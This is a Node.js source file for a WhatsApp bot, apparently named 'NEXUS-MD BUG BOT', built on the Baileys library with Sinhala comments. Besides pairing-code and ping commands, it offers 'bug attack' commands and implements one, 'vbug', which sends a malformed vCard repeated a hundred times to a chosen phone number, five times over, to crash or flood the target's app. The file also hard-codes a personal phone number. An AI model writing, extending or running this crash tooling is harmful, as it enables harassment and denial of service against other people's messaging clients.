const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    // --- පියවර 1: 94770475809 නම්බර් එකට කෝඩ් එක ගැනීම ---
    if (!sock.authState.creds.registered) {
        const myNumber = "94770475809"; 
        console.log(`⏳ ${myNumber} සඳහා Pairing Code එක සකසමින් පවතී...`);
        
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(myNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(`\n🔥 YOUR PAIRING CODE: ${code}\n`);
            } catch (err) {
                console.log("❌ Error generating code: ", err);
            }
        }, 6000); 
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') console.log('✅ Nexus-MD Online & Ready!');
        if (connection === 'close') startNexus();
    });

    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        
        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        // Private විතරයි (Group වල වැඩ නැහැ)
        if (isGroup) return;

        const prefix = ".";
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);

        // --- 1. MENU COMMAND ---
        if (command === 'menu' || command === 'help') {
            const menuText = `⚡ *NEXUS-MD BUG BOT* ⚡\n\n` +
                           `👋 *Hello Sasiya MD!*\n\n` +
                           `👾 *BUG COMMANDS:* \n` +
                           ` ◈ ${prefix}vbug [නම්බර්] - Vcard Crash\n` +
                           ` ◈ ${prefix}cbug [නම්බර්] - Character Bug\n` +
                           ` ◈ ${prefix}lbug [නම්බර්] - Location Crash\n\n` +
                           `🔗 *PAIRING SYSTEM:* \n` +
                           ` ◈ ${prefix}bot [නම්බර්] - Get Pairing Code\n\n` +
                           `🛠️ *OTHER:* \n` +
                           ` ◈ ${prefix}ping - Check Speed\n` +
                           ` ◈ ${prefix}owner - Contact Owner\n\n` +
                           `🛡️ *Status:* Anti-Ban Active\n` +
                           `🚀 *Powered by Developer Nexus*`;
            
            await sock.sendMessage(from, { 
                text: menuText,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS BUG SYSTEM V3.1",
                        body: "World's Best Bug Bot",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1
                    }
                }
            });
        }

        // --- 2. PUBLIC PAIRING (.bot command) ---
        if (command === 'bot') {
            let targetNum = args[0]?.replace(/[^0-9]/g, '');
            if (!targetNum) return sock.sendMessage(from, { text: "❌ මචං නම්බර් එකත් එක්ක ගහපන්. (.bot 947xxxxxxxx)" });

            await sock.sendMessage(from, { text: "⏳ පෝලිමේ ඉන්න... ඔයාගේ කෝඩ් එක හදනවා." });
            
            // අලුත් සෙශන් එකක් හදලා කෝඩ් එක දෙන ලොජික් එක
            const { state: tState } = await useMultiFileAuthState(`temp_${targetNum}`);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }) });

            setTimeout(async () => {
                try {
                    let code = await tSock.requestPairingCode(targetNum);
                    await sock.sendMessage(from, { text: `🔥 *YOUR PAIRING CODE:* ${code}\n\nමෙන්න මචං උඹ ඉල්ලපු කෝඩ් එක. මේක Linked Devices වල ගහපන්.` });
                } catch (e) {
                    await sock.sendMessage(from, { text: "❌ කෝඩ් එක හදන්න බැරි වුණා. පස්සේ ට්‍රයි කරන්න." });
                }
            }, 5000);
        }

        // --- 3. BUG ATTACKS ---
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;type=CELL;type=VOICE;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(100);
            
            await sock.sendMessage(from, { text: "💀 Vcard Attack Starting..." });
            for (let i = 0; i < 5; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
                await new Promise(r => setTimeout(r, 1000));
            }
            sock.sendMessage(from, { text: "✅ Done!" });
        }

        if (command === 'ping') {
            const start = Date.now();
            await sock.sendMessage(from, { text: "🚀 Pinging..." });
            const end = Date.now();
            sock.sendMessage(from, { text: `🔥 Speed: ${end - start}ms` });
        }
    });
}

startNexus();
